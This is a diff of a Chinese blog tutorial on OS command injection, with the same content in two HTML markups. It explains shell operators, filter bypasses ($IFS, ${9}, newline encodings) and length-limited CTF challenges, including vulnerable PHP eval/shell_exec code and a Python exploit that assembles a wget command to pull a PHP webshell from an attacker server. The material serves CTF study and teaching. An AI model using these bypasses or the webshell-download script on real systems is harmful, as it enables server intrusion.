@@ -220,90 +220,18 @@
 </blockquote>
 <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>OS命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p>
 <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>说到命令注入，我们不得不提到命令注入中几个常用的符号。</p>
-<h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h2><pre><code>语法格式如下：
-command1 &amp;&amp; command2 [&amp;&amp; command3 ...]
-1 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。
-2 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。
-3 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。
-</code></pre><h2 id="管道符号"><a href="#管道符号" class="headerlink" title="|(管道符号)"></a>|(管道符号)</h2><pre><code>| 表示管道，上一条命令的输出，作为下一条命令的参数
-</code></pre><h2 id=""><a href="#" class="headerlink" title="||"></a>||</h2><pre><code>语法格式如下：
-command1 || command2 [|| command3 ...]
-1 命令之间使用 || 连接，实现逻辑或的功能。
-2 只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。
-3 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。
-</code></pre><h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><pre><code>&amp; 表示将任务置于后台执行
-</code></pre><h2 id="分号"><a href="#分号" class="headerlink" title=";(分号)"></a>;(分号)</h2><pre><code>多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块
-</code></pre><h2 id="和"><a href="#和" class="headerlink" title="``和$()"></a>``和$()</h2><pre><code>在bash中，$( )与` `（反引号）都是用来作命令替换的。
-各自的优缺点：
-1. ` ` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反单引号容易打错或看错。
-2. $()更有可读性，但是$()并不是所有shell都支持。
-</code></pre><h2 id="和-1"><a href="#和-1" class="headerlink" title="()和{}"></a>()和{}</h2><pre><code>如果希望把几个命令合在一起执行，shell提供了两种方法。既可以在当前shell也可以在子shell中执行一组命令。
-(command1;command2;command3....)
-{ command1;command2;command3…} #第一条命令必须与左边的括号有一个空格，最后一条命令一定要有分号
-
-相同点：
-()和{}都是把一串的命令放在括号里面,并且命令之间用;号隔开
-不同点
-()只是对一串命令重新开一个子shell进行执行,{}对一串命令在当前shell执行
-()最后一个命令可以不用分号,{}最后一个命令要用分号
-()里的第一个命令和左边括号不必有空格,{}的第一个命令和左括号之间必须要有一个空格
-()和{}中括号里面的某个命令的重定向只影响该命令,但括号外的重定向则影响到括号里的所有命令
-</code></pre><h2 id="Shell-输入-输出重定向"><a href="#Shell-输入-输出重定向" class="headerlink" title="Shell 输入/输出重定向"></a>Shell 输入/输出重定向</h2><p>来自菜鸟教程：</p>
-<pre><code>大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。
-</code></pre><pre><code>命令说明：
-command &gt; file：将输出重定向到 file。
-command &lt; file：将输入重定向到 file。
-command &gt;&gt; file：将输出以追加的方式重定向到 file。
-n &gt; file：将文件描述符为 n 的文件重定向到 file。
-n &gt;&gt; file：将文件描述符为 n 的文件以追加的方式重定向到 file。
-n &gt;&amp; m：将输出文件 m 和 n 合并。
-n &lt;&amp; m：将输入文件 m 和 n 合并。
-&lt;&lt; tag：将开始标记 tag 和结束标记 tag 之间的内容作为输入。
-
-需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。
-</code></pre><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><pre><code>
-^
-匹配输入字符串的开始位置。
-
-$
-匹配输入字符串的结束位置。
-
-*
-匹配前面的子表达式零次或多次
-
-+
-匹配前面的子表达式一次或多次。
-
-?
-匹配前面的子表达式零次或一次。
-
-{n}
-n 是一个非负整数。匹配确定的 n 次。
-
-{n,}
-n 是一个非负整数。至少匹配n 次。
-
-{n,m}
-m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。
-
-?
-当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。
-
-.
-匹配除换行符（\n、\r）之外的任何单个字符。
-
-[xyz]
-字符集合。匹配所包含的任意一个字符。
-</code></pre><p>还有一些内置的通用字符簇</p>
-<pre><code>[[:alpha:]] 任何字母
-[[:digit:]] 任何数字
-[[:alnum:]] 任何字母和数字
-[[:space:]] 任何空白字符
-[[:upper:]] 任何大写字母
-[[:lower:]] 任何小写字母
-[[:punct:]] 任何标点符号
-[[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F]
-</code></pre><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="一些常见的限制"><a href="#一些常见的限制" class="headerlink" title="一些常见的限制"></a>一些常见的限制</h2><h3 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符<code>*</code>和<code>?</code>的使用</h3><figure class="image-bubble">
+<h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法格式如下：</span><br><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 ...]</span><br><span class="line">1 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</span><br><span class="line">2 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。</span><br><span class="line">3 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="管道符号"><a href="#管道符号" class="headerlink" title="|(管道符号)"></a>|(管道符号)</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></tbody></table></figure>
+<h2 id=""><a href="#" class="headerlink" title="||"></a>||</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法格式如下：</span><br><span class="line">command1 || command2 [|| command3 ...]</span><br><span class="line">1 命令之间使用 || 连接，实现逻辑或的功能。</span><br><span class="line">2 只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</span><br><span class="line">3 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; 表示将任务置于后台执行</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="分号"><a href="#分号" class="headerlink" title=";(分号)"></a>;(分号)</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="和"><a href="#和" class="headerlink" title="``和$()"></a>``和$()</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在bash中，$( )与` `（反引号）都是用来作命令替换的。</span><br><span class="line">各自的优缺点：</span><br><span class="line">1. ` ` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反单引号容易打错或看错。</span><br><span class="line">2. $()更有可读性，但是$()并不是所有shell都支持。</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="和-1"><a href="#和-1" class="headerlink" title="()和{}"></a>()和{}</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如果希望把几个命令合在一起执行，shell提供了两种方法。既可以在当前shell也可以在子shell中执行一组命令。</span><br><span class="line">(command1;command2;command3....)</span><br><span class="line">{ command1;command2;command3…} #第一条命令必须与左边的括号有一个空格，最后一条命令一定要有分号</span><br><span class="line"></span><br><span class="line">相同点：</span><br><span class="line">()和{}都是把一串的命令放在括号里面,并且命令之间用;号隔开</span><br><span class="line">不同点</span><br><span class="line">()只是对一串命令重新开一个子shell进行执行,{}对一串命令在当前shell执行</span><br><span class="line">()最后一个命令可以不用分号,{}最后一个命令要用分号</span><br><span class="line">()里的第一个命令和左边括号不必有空格,{}的第一个命令和左括号之间必须要有一个空格</span><br><span class="line">()和{}中括号里面的某个命令的重定向只影响该命令,但括号外的重定向则影响到括号里的所有命令</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="Shell-输入-输出重定向"><a href="#Shell-输入-输出重定向" class="headerlink" title="Shell 输入/输出重定向"></a>Shell 输入/输出重定向</h2><p>来自菜鸟教程：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">命令说明：</span><br><span class="line">command &gt; file：将输出重定向到 file。</span><br><span class="line">command &lt; file：将输入重定向到 file。</span><br><span class="line">command &gt;&gt; file：将输出以追加的方式重定向到 file。</span><br><span class="line">n &gt; file：将文件描述符为 n 的文件重定向到 file。</span><br><span class="line">n &gt;&gt; file：将文件描述符为 n 的文件以追加的方式重定向到 file。</span><br><span class="line">n &gt;&amp; m：将输出文件 m 和 n 合并。</span><br><span class="line">n &lt;&amp; m：将输入文件 m 和 n 合并。</span><br><span class="line">&lt;&lt; tag：将开始标记 tag 和结束标记 tag 之间的内容作为输入。</span><br><span class="line"></span><br><span class="line">需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">^</span><br><span class="line">匹配输入字符串的开始位置。</span><br><span class="line"></span><br><span class="line">$</span><br><span class="line">匹配输入字符串的结束位置。</span><br><span class="line"></span><br><span class="line">*</span><br><span class="line">匹配前面的子表达式零次或多次</span><br><span class="line"></span><br><span class="line">+</span><br><span class="line">匹配前面的子表达式一次或多次。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">匹配前面的子表达式零次或一次。</span><br><span class="line"></span><br><span class="line">{n}</span><br><span class="line">n 是一个非负整数。匹配确定的 n 次。</span><br><span class="line"></span><br><span class="line">{n,}</span><br><span class="line">n 是一个非负整数。至少匹配n 次。</span><br><span class="line"></span><br><span class="line">{n,m}</span><br><span class="line">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">匹配除换行符（\n、\r）之外的任何单个字符。</span><br><span class="line"></span><br><span class="line">[xyz]</span><br><span class="line">字符集合。匹配所包含的任意一个字符。</span><br></pre></td></tr></tbody></table></figure>
+<p>还有一些内置的通用字符簇<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[[:alpha:]] 任何字母</span><br><span class="line">[[:digit:]] 任何数字</span><br><span class="line">[[:alnum:]] 任何字母和数字</span><br><span class="line">[[:space:]] 任何空白字符</span><br><span class="line">[[:upper:]] 任何大写字母</span><br><span class="line">[[:lower:]] 任何小写字母</span><br><span class="line">[[:punct:]] 任何标点符号</span><br><span class="line">[[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F]</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="一些常见的限制"><a href="#一些常见的限制" class="headerlink" title="一些常见的限制"></a>一些常见的限制</h2><h3 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符<code>*</code>和<code>?</code>的使用</h3><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174451-083fa032-1c98-1.png" alt="image.png" title="">
@@ -333,9 +261,8 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>使用特殊变量:<code>$IFS</code></p>
-<pre><code>IFS的默认值为：空白（包括：空格，tab, 和新行)
-</code></pre><figure class="image-bubble">
+<p>使用特殊变量:<code>$IFS</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFS的默认值为：空白（包括：空格，tab, 和新行)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180235-82c6e07a-1c9a-1.png" alt="image.png" title="">
@@ -372,9 +299,8 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>使用特殊变量${9}</p>
-<pre><code>${9}对应空字符串
-</code></pre><figure class="image-bubble">
+<p>使用特殊变量${9}<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">${9}对应空字符串</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181515-47fd220e-1c9c-1.png" alt="image.png" title="">
@@ -425,13 +351,7 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
                 <div class="image-caption">image.png</div>
             </figure>
 <p>使用<code>%0a(\n)</code>，<code>%0d(\r)</code>，<code>%09(\t)</code>等字符也可以bypass一些过滤，这里就会不多去赘述了</p>
-<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token delimiter">?></span>
-</code></pre>
+<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $param = $_POST[<span class="string">'param'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($param) &lt; <span class="number">17</span>){</span><br><span class="line">        <span class="keyword">eval</span>($param);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 <p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br></p><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -439,12 +359,7 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
                 </div>
                 <div class="image-caption">image.png</div>
             </figure><p></p>
-<h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter">?></span>
-</code></pre>
+<h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>){</span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 <p>这里要用到我们前面所讲到的重定向，<code>n &gt; file</code>：将文件描述符为 n 的文件重定向到 file。<br>既然我们不能一次执行一条完整的命令，我们可以分为多次<br>举个简单的例子</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -453,26 +368,7 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>ls是默认以文件名排序的，所以我们为了控制我们命令的顺序，可以使用ls -t按时间逆序。<br>不过这里考虑到直接写shell有点麻烦（因为php中的一些符号用到shell中是有意义的，要各种转义，为了节省代码量我们直接用curl或者是wget从服务器dump一个shell下来）<br>exp如下：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">">php\\"</span><span class="token punctuation">,</span><span class="token string">">\\ 1.\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ -O\\\\"</span><span class="token punctuation">,</span><span class="token string">">cn\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ a.\\\\"</span><span class="token punctuation">,</span><span class="token string">">wget\\\\"</span><span class="token punctuation">]</span>
-<span class="token comment" spellcheck="true">#可以修改hosts文件，让a.cn指向一个自己的服务器。</span>
-<span class="token comment" spellcheck="true">#index.html是一个php的shell</span>
-url<span class="token operator">=</span><span class="token string">"http://192.168.163.128/test.php"</span>
-<span class="token keyword">for</span> x <span class="token keyword">in</span> name<span class="token punctuation">:</span>
-    <span class="token keyword">print</span> x
-    param<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span>x<span class="token punctuation">}</span>
-    a<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param<span class="token punctuation">)</span>
-param1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'ls -t>a'</span><span class="token punctuation">}</span>
-param2<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'sh a'</span><span class="token punctuation">}</span>
-requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param1<span class="token punctuation">)</span>
-requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">)</span>
-b<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://192.168.163.128/1.php"</span><span class="token punctuation">)</span>
-<span class="token keyword">if</span> b<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span> <span class="token string">"ok!"</span>
-<span class="token keyword">else</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span> <span class="token string">"bad!"</span>
-</code></pre>
+<p>ls是默认以文件名排序的，所以我们为了控制我们命令的顺序，可以使用ls -t按时间逆序。<br>不过这里考虑到直接写shell有点麻烦（因为php中的一些符号用到shell中是有意义的，要各种转义，为了节省代码量我们直接用curl或者是wget从服务器dump一个shell下来）<br>exp如下：<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">name=[<span class="string">"&gt;php\\"</span>,<span class="string">"&gt;\\ 1.\\\\"</span>,<span class="string">"&gt;\\ -O\\\\"</span>,<span class="string">"&gt;cn\\\\"</span>,<span class="string">"&gt;\\ a.\\\\"</span>,<span class="string">"&gt;wget\\\\"</span>]</span><br><span class="line"><span class="comment">#可以修改hosts文件，让a.cn指向一个自己的服务器。</span></span><br><span class="line"><span class="comment">#index.html是一个php的shell</span></span><br><span class="line">url=<span class="string">"http://192.168.163.128/test.php"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> name:</span><br><span class="line">	<span class="keyword">print</span> x</span><br><span class="line">	param={<span class="string">'1'</span>:x}</span><br><span class="line">	a=requests.get(url,params=param)</span><br><span class="line">param1={<span class="string">'1'</span>:<span class="string">'ls -t&gt;a'</span>}</span><br><span class="line">param2={<span class="string">'1'</span>:<span class="string">'sh a'</span>}</span><br><span class="line">requests.get(url,params=param1)</span><br><span class="line">requests.get(url,params=param2)</span><br><span class="line">b=requests.get(<span class="string">"http://192.168.163.128/1.php"</span>)</span><br><span class="line"><span class="keyword">if</span> b.status_code == <span class="number">200</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"ok!"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"bad!"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -481,18 +377,7 @@ b<span class="token operator">=</span>requests<span class="token punctuation">.<
                 <div class="image-caption">image.png</div>
             </figure>
 <p>可以发现成功写了shell</p>
-<h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>HITCON CTF 2017-BabyFirst Revenge</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-   <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-   @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-   @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-       @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-       @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-   <span class="token punctuation">}</span>
-   <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
+<h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>HITCON CTF 2017-BabyFirst Revenge<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">   @mkdir($sandbox);</span><br><span class="line">   @chdir($sandbox);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) {</span><br><span class="line">       @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">   } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) {</span><br><span class="line">       @exec(<span class="string">'/bin/rm -rf '</span> . 